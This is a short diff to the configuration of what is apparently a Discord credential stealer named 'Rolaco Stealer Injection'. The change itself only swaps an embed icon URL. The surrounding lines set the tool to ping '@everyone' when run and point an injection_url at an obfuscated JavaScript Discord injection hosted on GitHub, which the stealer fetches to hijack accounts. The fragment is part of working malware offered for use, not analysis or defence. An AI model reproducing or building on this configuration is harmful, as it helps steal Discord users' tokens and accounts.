@@ -13,7 +13,7 @@ const config = {
   ping_on_run: true, 
   ping_val: '@everyone', 
   embed_name: 'Rolaco Stealer Injection', 
-  embed_icon: 'https://raw.githubusercontent.com/Rolaco0/kweihfgwefwge/main/icon.ico',
+  embed_icon: 'https://raw.githubusercontent.com/Rolaco0/Rolacoim/main/mascot.png',
   embed_color: 5639644, 
   injection_url: 'https://raw.githubusercontent.com/Rolaco0/Discord-Injection-RG/main/injection-obfuscated.js', 
 
